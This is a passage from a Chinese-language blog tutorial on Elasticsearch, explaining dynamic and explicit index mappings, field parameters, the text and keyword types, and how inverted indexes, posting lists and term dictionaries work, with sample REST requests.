start=\"2\">\n<li><strong>主动创建（显示映射）</strong></li>\n</ol>\n<p>动态映射只能保证最基础的数据结构的映射，所以很多时候我们需要对字段除了数据结构定义更多的限制的时候，动态映射创建的内容很可能不符合我们的需求，所以可以使用 PUT {index}&#x2F;mapping 来更新指定索引的映射内容。</p>\n<h2 id=\"7-2-动态映射Dynamic-Mapping\"><a href=\"#7-2-动态映射Dynamic-Mapping\" class=\"headerlink\" title=\"7.2 动态映射Dynamic Mapping\"></a>7.2 动态映射Dynamic Mapping</h2><p>写入文档的时候，索引不存在，会自动创建索引， 无需手动创建，ES会根据内容推断字段的类型，推断会不准确，可能造成某些功能无法使用，例如 范围查询。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /log2/\\_doc/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;uid&quot; : 1,  </span><br><span class=\"line\">    &quot;ip&quot; : &quot;192.1.1.1&quot;,  </span><br><span class=\"line\">    &quot;transTime&quot; : &quot;2018-01-01&quot;,  </span><br><span class=\"line\">    &quot;content&quot; : &quot;中华人民共和国人民大会堂&quot;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">查看一个索引当前的mapping  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /log2/\\_mapping  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;log2&quot;: &#123;  </span><br><span class=\"line\">        &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;content&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                        &quot;keyword&quot;: &#123;  </span><br><span class=\"line\">                            &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                            &quot;ignore\\_above&quot;: 256  </span><br><span class=\"line\">                        &#125;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;ip&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                        &quot;keyword&quot;: &#123;  </span><br><span class=\"line\">                            &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                            &quot;ignore\\_above&quot;: 256  </span><br><span class=\"line\">                        &#125;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;transTime&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;date&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;uid&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">动态映射规则</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th><strong>JSON中数据类型</strong></th>\n<th><strong>Elasticsearch 数据类型</strong></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>null</td>\n<td>不添加任何字段</td>\n</tr>\n<tr>\n<td>true或者false</td>\n<td>boolean类型</td>\n</tr>\n<tr>\n<td>浮点数据</td>\n<td>float类型</td>\n</tr>\n<tr>\n<td>integer数据</td>\n<td>long类型</td>\n</tr>\n<tr>\n<td>object</td>\n<td>object类型</td>\n</tr>\n<tr>\n<td>array</td>\n<td>取决于数组中的第一个非空值的类型。</td>\n</tr>\n<tr>\n<td>string</td>\n<td>匹配日期格式，设置为date；匹配数字，设置为float或者long，功能默认关闭；设置为text，并增加keyword子字段。</td>\n</tr>\n</tbody></table>\n<h2 id=\"7-3-显示的设置mapping\"><a href=\"#7-3-显示的设置mapping\" class=\"headerlink\" title=\"7.3 显示的设置mapping\"></a>7.3 显示的设置mapping</h2><p>显示的设置mapping可以更灵活控制ES。 映射创建时，除了对字段的定义，Mapping创建的时候提供了一些对于查询策略和自身定义的参数配置。 下面只是简单介绍下映射支持的字段参数内容。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>analyzer</td>\n<td>定义此字段索引时使用的分词方式</td>\n</tr>\n<tr>\n<td>normalizer</td>\n<td>normalizer功能类似于analyzer，但是其可以使查询条件输出唯一的查询条件（可以认为其只是实现了条件小写等不会产生多个查询条件的相关操作）</td>\n</tr>\n<tr>\n<td>boost</td>\n<td>定义当前字段的查询权重</td>\n</tr>\n<tr>\n<td>coerce</td>\n<td>此字段控制是否尝试修复部分错误的数据格式，（比如对一个整数字段插入字符串比如”5”，此时此字符串可以被解析为数字），默认为true</td>\n</tr>\n<tr>\n<td>copy_to</td>\n<td>类似于别名，不同之处参数可以将此字段内容复制到指定字段中，多个字段可以复制到同一个字段中</td>\n</tr>\n<tr>\n<td>doc_values</td>\n<td>倒排索引虽然可以快速查询文档中内容，但是在进行排序或聚合操作的时候，倒排索引并不能获得文档内容，所以需要存储一份文档数据到doc_values，而此参数控制字段是否需要存储在doc_values中的开关。</td>\n</tr>\n<tr>\n<td>dynamic</td>\n<td>是否开启动态映射，目前支持三个参数：true&#x2F;false 开启和关闭，strict 当出现未定义的字段，抛出异常并拒绝添加文档</td>\n</tr>\n<tr>\n<td>enabled</td>\n<td>此参数控制字段是否可以被索引，当被设置为false的时候表示此字段仅用来存储而无需索引，此时ES不会分析此字段内的数据，所以即使插入的非法的数据内容ES依旧允许执行</td>\n</tr>\n<tr>\n<td>fielddata</td>\n<td>类似doc_values都是单独存储额外的文档数据，这样通过倒排索引获取文档内容，从而实现在排序和聚合上的功能。不同的是doc_values不支持text格式，text格式数据需要使用fielddata。此参数默认是禁止的，这是因为在第一次对字段进行排序或聚合的时候它会把这个列数据都加载到内存中，这样会带来大量的内存消耗。</td>\n</tr>\n<tr>\n<td>eager_global_ordinals</td>\n<td>是否使用全局序号来进行聚合。主要在聚合分析构建hash的时候，使用序号来替代doc的值，这样在文档收集阶段根据需要收集到各个桶中，在计算结果时将序号转换为具体doc内容。但是此操作在每次查询时需要重建doc序号关系</td>\n</tr>\n<tr>\n<td>format</td>\n<td>日期类型字段用来解析的日期格式</td>\n</tr>\n<tr>\n<td>ignore_above</td>\n<td>当插入字段长度超过此字段设置的值后，此内容将不被索引或存储。对于数组结构字段会作用到每一个元素</td>\n</tr>\n<tr>\n<td>ignore_malformed</td>\n<td>当向一个字段插入错误的数据类似时，会抛出异常并拒绝文档。但设置此参数后，对字段插入错误的数据时会忽略异常，此文档错误的数据将不被索引，但是其他字段则正常。</td>\n</tr>\n<tr>\n<td>index_options</td>\n<td>控制将哪些信息添加到反向索引中</td>\n</tr>\n<tr>\n<td>index_phrases</td>\n<td>主要将两个单词的组合索引到单独字段中，这样在进行精确的短语查询的时候会更有效。支持true和false参数。默认为false。此参数会使索引变大</td>\n</tr>\n<tr>\n<td>index_prefixes</td>\n<td>允许对字段的前缀进行索引，此参数用来提高查询的速度</td>\n</tr>\n<tr>\n<td>index</td>\n<td>控制字段是否可以被索引，被设置为false的字段无法被索引到</td>\n</tr>\n<tr>\n<td>fields</td>\n<td>此参数可以为同一个字段设置不同的索引方式，但是在_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小</td>\n</tr>\n<tr>\n<td>norms</td>\n<td>norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false</td>\n</tr>\n<tr>\n<td>null_value</td>\n<td>一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引</td>\n</tr>\n<tr>\n<td>position_increment_gap</td>\n<td>增加近似值匹配</td>\n</tr>\n<tr>\n<td>properties</td>\n<td>定义类型映射、对象字段和嵌套字段等数据</td>\n</tr>\n<tr>\n<td>search_analyzer</td>\n<td>定义此字段查询时使用的分词方式</td>\n</tr>\n<tr>\n<td>similarity</td>\n<td>此参数可以配置用来计算字段相似性的算法</td>\n</tr>\n<tr>\n<td>store</td>\n<td>默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。</td>\n</tr>\n<tr>\n<td>term_vector</td>\n<td>术语向量的定义，存储一些术语向量，以便可以为特定文档检索它们</td>\n</tr>\n<tr>\n<td>index</td>\n<td>控制字段是否可以被索引，被设置为false的字段无法被索引到</td>\n</tr>\n<tr>\n<td>fields</td>\n<td>此参数可以为同一个字段设置不同的索引方式，但是在_source字段中只会保存一份，并不会实际增加存储。但是会增加索引大小</td>\n</tr>\n<tr>\n<td>norms</td>\n<td>norms里面存储的是各种各样的归一化因子，此内容会影响到文档的得分，在不需要对字段进行打分的时候可以禁用此参数，需要注意的是对于keyword字段默认为false</td>\n</tr>\n<tr>\n<td>null_value</td>\n<td>一般来说空值是无法被索引的，但是此参数允许使用指定的值替换空值，以对其进行索引</td>\n</tr>\n<tr>\n<td>position_increment_gap</td>\n<td>增加近似值匹配</td>\n</tr>\n<tr>\n<td>properties</td>\n<td>定义类型映射、对象字段和嵌套字段等数据</td>\n</tr>\n<tr>\n<td>search_analyzer</td>\n<td>定义此字段查询时使用的分词方式</td>\n</tr>\n<tr>\n<td>similarity</td>\n<td>此参数可以配置用来计算字段相似性的算法</td>\n</tr>\n<tr>\n<td>store</td>\n<td>默认情况下字段内容会被索引但是并不会存储字段中的值，想获取字段中的值则需要在source中获取对应字段的数据，当查询仅仅是尝试获取指定字段的内容的时候，可以设置此参数为true，那么系统可以直接获取此字段的内容，不再尝试获取source中的数据。</td>\n</tr>\n</tbody></table>\n<ol>\n<li><p><strong>index</strong> 表示字段是否索引。</p>\n</li>\n<li><p><strong>index_options</strong></p>\n</li>\n</ol>\n<p>index_options 控制倒排索引记录的内容，一共有4种配置可选。</p>\n<table>\n<thead>\n<tr>\n<th>index_options</th>\n<th>含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>docs</td>\n<td>只记录文档id（ doc id ）</td>\n</tr>\n<tr>\n<td>freqs</td>\n<td>记录 doc id 和 term frequences</td>\n</tr>\n<tr>\n<td>positions</td>\n<td>doc id 、 term frequences 、 term position</td>\n</tr>\n<tr>\n<td>offsets</td>\n<td>doc id 、 term frequences 、 term position 、 character</td>\n</tr>\n<tr>\n<td>offsets</td>\n<td></td>\n</tr>\n</tbody></table>\n<p>文本类型 text 默认的配置是 positions ，其他默认是docs。 需要注意的是，虽然index_options提供了offsets这种内容较多的配置级别，但是记录的内容越多，占用的空间也会越多，在实际操作中还是要根据实际情况进行配置。 例如创建mapping,字段名为user_name，字符串类型。user_name不需要索引,info字段的倒排索引类型为positions。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT mapping\\_test3  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;properties&quot;: &#123;  </span><br><span class=\"line\">            &quot;user\\_name&quot;: &#123;  </span><br><span class=\"line\">                &quot;index&quot;: false,  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;info&quot;: &#123;  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;positions&quot;,  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;doc&quot;: &#123;  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;docs&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;freq&quot;: &#123;  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;freqs&quot;  </span><br><span class=\"line\">            &#125;,  </span><br><span class=\"line\">            &quot;offset&quot;: &#123;  </span><br><span class=\"line\">                &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;index\\_options&quot;: &quot;offsets&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>ANALYZER</strong> 分词器。es有内置的分词器，也可以使用第三方的分词工具。如IK。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;content&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;analyzer&quot;: &quot;ik\\_max\\_word&quot;,//写入是的分词器  </span><br><span class=\"line\">                    &quot;search\\_analyzer&quot;: &quot;ik\\_max\\_word&quot;//搜索时的分词器  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>COPY_TO</strong></li>\n</ol>\n<p>允许将一个或者多个字段的值复制到某一个字段中。用来满足一些搜索需要，类似于数据库 title like “%a%” or title2 like “%a%” copy_to的字段不会出现在_source里面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;first\\_name&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;copy\\_to&quot;: &quot;full\\_name&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;last\\_name&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;copy\\_to&quot;: &quot;full\\_name&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;full\\_name&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">PUT my\\_index/my\\_type/1  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;first\\_name&quot;: &quot;John&quot;,  </span><br><span class=\"line\">    &quot;last\\_name&quot;: &quot;Smith&quot;  </span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">//full\\_name = \\[&quot;John&quot;,&quot;Smith&quot;\\]  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>DOC_VALUES</strong></li>\n</ol>\n<p>为了加快排序、聚合操作，在建立倒排索引的时候，额外增加一个列式存储映射，是一个空间换时间的做法。 默认是开启的，对于确定不需要聚合或者排序的字段可以关闭。 注意：text类型没有doc_values。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;status\\_code&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">                &#125;,  </span><br><span class=\"line\">                &quot;session\\_id&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                    &quot;doc\\_values&quot;: false  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>ENABLED</strong></li>\n</ol>\n<p>enabled默认为true,将搜索所有字段。如果设置为false，该字段将不会被搜索。但仍会随着_source返回</p>\n<ol start=\"7\">\n<li><strong>FIELDDATA</strong></li>\n</ol>\n<p>对非text类型的字段进行排序可以使用doc_value来进行加速。但是对于，text类型的字段，却不能进行分组排序。更何况加速。 下面这个异常展示了，对text类型的字段进行分组排序的错误。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/27.png\"><br>但是可以通过设置fielddata值来达到这一目的。它将字段加载到内存中，因此第一次肯定会很慢。而且将占用内存。</p>\n<ol start=\"8\">\n<li><strong>FORMAT</strong></li>\n</ol>\n<p>对字段进行格式化。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;date&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;date&quot;,  </span><br><span class=\"line\">                    &quot;format&quot;: &quot;yyyy-MM-dd&quot;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li><strong>IGNORE_ABOVE</strong></li>\n</ol>\n<p>大小超过ignore_above设置的字符串不会被索引或存储。</p>\n<ol start=\"10\">\n<li>FIELDS</li>\n</ol>\n<p>可以为一个字段映射多个数据类型。比如，一个字符串，可以映射为text，满足全文搜索。同时可以映射为keyword,满足分组和排序。 也可以使用多个分词器来对同一个字段进行分词。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;mappings&quot;: &#123;  </span><br><span class=\"line\">        &quot;my\\_type&quot;: &#123;  </span><br><span class=\"line\">            &quot;properties&quot;: &#123;  </span><br><span class=\"line\">                &quot;city&quot;: &#123;  </span><br><span class=\"line\">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                    &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                        &quot;raw&quot;: &#123;  </span><br><span class=\"line\">                            &quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">                        &#125;  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"11\">\n<li><strong>STORE</strong></li>\n</ol>\n<p>我们知道，source字段存储了原始数据(默认)。当然可以通过设置其属性值来选择不存储。此外，还可以通过store选择是否额外存储某个字段。store属性默认为no,表示不存储。当设置为yes时，会在source之 外独立存储。此时，搜索时，会绕过_source，单独进行一次IO得到该字段的值。 store会严重影响搜索效率，尽管如此，在以下两种情况下，还是可以选择使用：</p>\n<ul>\n<li><p>字段很长，每次检索_source代价很大。</p>\n</li>\n<li><p>需要单独对某些字段进行索引重建。</p>\n</li>\n</ul>\n<h2 id=\"7-4-ES中常见数据类型\"><a href=\"#7-4-ES中常见数据类型\" class=\"headerlink\" title=\"7.4 ES中常见数据类型\"></a>7.4 ES中常见数据类型</h2><ol>\n<li><strong>字符串</strong></li>\n</ol>\n<p>字符串在之前的版本主要指的是 string 类型。但是在5.X版本已经不支持 string 类型。其被 text 和keyword 类型替代</p>\n<ol start=\"2\">\n<li><strong>text</strong></li>\n</ol>\n<p>text字段需要被全文搜索的内容，它可以保存非常长的内容。查询的时候一般使用分词器器进⾏行行分词然后进行全文搜索。text类型的字段不用于排序，很少用于聚合。 （text类型的数据被用来索引长文本，例如电子邮件主体部分或者一款产品的介绍，这些文本会被分析，在建立索引文档之前会被分词器进行分词，转化为词组。经过分词机制之后es允许检索到该文本切分而成的词语，但是text类型的数据不能用来过滤、排序和聚合等操作。</p>\n<ol start=\"3\">\n<li><strong>keyword</strong></li>\n</ol>\n<p>此字段不能使用分词器进行查询，只能搜索该字段的完整的值。所以其主要保存一些可以索引的结构化内容。此字段可以进行排序、聚合等操作。 keyword类型的数据可以满足电子邮箱地址、主机名、状态码、邮政编码和标签等数据的要求，不进行分词，常常被用来过滤、排序和聚合。 综上，可以发现text类型在存储数据的时候会默认进行分词，并生成索引。而keyword存储数据的时候，不会分词建立索引，显然，这样划分数据更加节省内存。）</p>\n<h1 id=\"8-底层知识：正排索引和倒排索引底层原理\"><a href=\"#8-底层知识：正排索引和倒排索引底层原理\" class=\"headerlink\" title=\"8 底层知识：正排索引和倒排索引底层原理\"></a>8 底层知识：正排索引和倒排索引底层原理</h1><h2 id=\"8-1-什么是正排索引\"><a href=\"#8-1-什么是正排索引\" class=\"headerlink\" title=\"8.1 什么是正排索引\"></a>8.1 什么是正排索引</h2><p>正排索引是按照文档编号或文档ID等有序的方式将每个文档存储在索引中，通过文档编号或ID进行检索。</p>\n<p>这种方式类似于数据库表的行，可以很方便地根据文档ID检索到具体的文档，但是不适合处理大规模文档库的情况。</p>\n<h2 id=\"比如mysql的b-锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8-2-什么是倒排索引\"><a href=\"#比如mysql的b-锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8-2-什么是倒排索引\" class=\"headerlink\" title=\"比如mysql的b+锁索引结构比如书籍目录，可以根据页码找文档内容，就是正排索引8.2 什么是倒排索引\"></a>比如mysql的b+锁索引结构<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/28.png\"><br>比如书籍目录，可以根据页码找文档内容，就是正排索引<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/29.png\"><br>8.2 什么是倒排索引</h2><h2 id=\"倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。-倒排索引可以理解为Map-item-list-id-，能够由查询词快速（时间复杂度O-1-）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8-3-ES如何做到快速索引\"><a href=\"#倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。-倒排索引可以理解为Map-item-list-id-，能够由查询词快速（时间复杂度O-1-）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8-3-ES如何做到快速索引\" class=\"headerlink\" title=\"倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map&lt; item, list&lt; id&gt;&gt;，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。比如书籍索引页根据关键词，找页码就是倒排索引8.3 ES如何做到快速索引\"></a>倒排索引是按照单词或关键字将文档进行索引，并记录包含该词汇的文档列表。这种方式类似于数据库表的列，可以将具有相同属性的文档按照关键词进行分类，从而实现更加高效和精确的文本搜索。 倒排索引可以理解为Map&lt; item, list&lt; id&gt;&gt;，能够由查询词快速（时间复杂度O(1)）找到包含这个查询词的文件的数据结构。<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/30.png\"><br>比如书籍索引页根据关键词，找页码就是倒排索引<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/31.png\"><br>8.3 ES如何做到快速索引</h2><p>假设有这么几条数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">| ID | Name | Age | Sex |  </span><br><span class=\"line\">| -- |:------------:| -----:| -----:|  </span><br><span class=\"line\">| 1 | Kate | 24 | Female  </span><br><span class=\"line\">| 2 | John | 24 | Male  </span><br><span class=\"line\">| 3 | Bill | 29 | Male  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>ID是Elasticsearch自建的文档id，那么Elasticsearch建立的索引如下: Name：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">| Term | Posting List |  </span><br><span class=\"line\">| -- |:----:|  </span><br><span class=\"line\">| Kate | 1 |  </span><br><span class=\"line\">| John | 2 |  </span><br><span class=\"line\">| Bill | 3 |  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Age：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">| Term | Posting List |  </span><br><span class=\"line\">| -- |:----:|  </span><br><span class=\"line\">| 24 | \\[1,2\\] |  </span><br><span class=\"line\">| 29 | 3 |  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"8-3-1-Posting-List\"><a href=\"#8-3-1-Posting-List\" class=\"headerlink\" title=\"8.3.1 Posting List\"></a>8.3.1 Posting List</h3><p>Elasticsearch分别为每个field都建立了一个倒排索引，</p>\n<ul>\n<li><p>Kate, John, 24, Female这些叫term，</p>\n</li>\n<li><p>而[1,2]就是Posting List。</p>\n</li>\n</ul>\n<p>Posting list就是一个int的数组，存储了所有符合某个term的文档id。 根据id查找的话，通过posting list这种索引方式似乎可以很快进行查找，比如要找age&#x3D;24的同学，在id数组中查找即可。二分查找，但是，如果想通过name来查找呢？</p>\n<h3 id=\"8-3-2-Term-Dictionary\"><a href=\"#8-3-2-Term-Dictionary\" class=\"headerlink\" title=\"8.3.2 Term Dictionary\"></a>8.3.2 Term Dictionary</h3><p>Elasticsearch为了能快速找到某个term，将所有的term排个序，二分法查找term，logN的查找效， 就像通过字典查找一样. 这样我们可以用二分查找的方式，比全遍历更快地找出目标的term。 这个就是 term dictionary。 所以：反向索引分成两部分，如下图(来自《信息检索导论》)：<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/32.png\"><br>左面是词项词典(Term Dictionary)，右边是倒排记录表(Posting)。 在Lucene中，词典和倒排是分开存储的，词典存储在.tii和.tis文件中。 而倒排又分为两部分存储，第一部分是文档号和词频信息，存储在.frq中；另一部分是词的位置信息， 存储在.prx文件中。 有了term dictionary之后，可以用 logN 次磁盘查找得到目标。 问题是：现在再看起来，似乎和传统数据库通过B+Tree的方式类似啊，为什么说比B+Tree的查询快？</p>\n<h3 id=\"8-3-3-Term-Index\"><a 